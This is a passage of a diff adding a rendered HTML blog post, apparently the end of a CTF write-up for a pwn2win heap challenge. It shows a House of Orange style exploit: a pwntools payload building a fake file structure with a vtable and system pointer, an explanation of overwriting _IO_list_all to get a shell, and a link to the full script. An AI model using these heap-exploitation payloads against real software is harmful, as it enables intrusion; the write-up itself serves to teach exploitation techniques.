+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">vtable</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="s">'y'</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Next malloc call should definitely overwrite <strong>_IO_list_all</strong> and subsequently abort also , thus giving us shell.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x7ffff7a8ee0c &lt;_int_malloc+652&gt;:	mov    QWORD PTR <span class="o">[</span>rbx+0x70],r15
+   0x7ffff7a8ee10 &lt;_int_malloc+656&gt;:	mov    QWORD PTR <span class="o">[</span>r15+0x10],r12
+
+</code></pre></div></div>
+<p>r15 was the fd which was IO_list-0x10 , and that is overwritten with r12 which is the pointer to top chunk in main_arena.</p>
+
+<p>Now while closing the file structures , in the linked list , <strong>IO_flushall_lockp</strong> will be fooled to see our fake file structure and thus give us shell.</p>
+
+<p>On the very next malloc , we get our sweet shell.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">add</span><span class="p">(</span><span class="s">"third"</span><span class="p">,</span><span class="s">"shell"</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<h2 id="conclusion">CONCLUSION</h2>
+
+<p>Awesome challenge , Awesome Idea , kudos to team pwn2win for such a beautiful challenge.</p>
+
+<p>Here’s the complete <a href="https://gist.github.com/PwnVerse/96c30d61ac33d692c04074157d033c31">Script</a></p>
+
+<h3 id="references">References</h3>
+
+<ul>
+  <li><a href="https://jkrshnmenon.wordpress.com/2017/08/30/hitcon-2016-house-of-orange-writeup/">JayKrishna Menon’s Blog</a></li>
+</ul>
+:ET
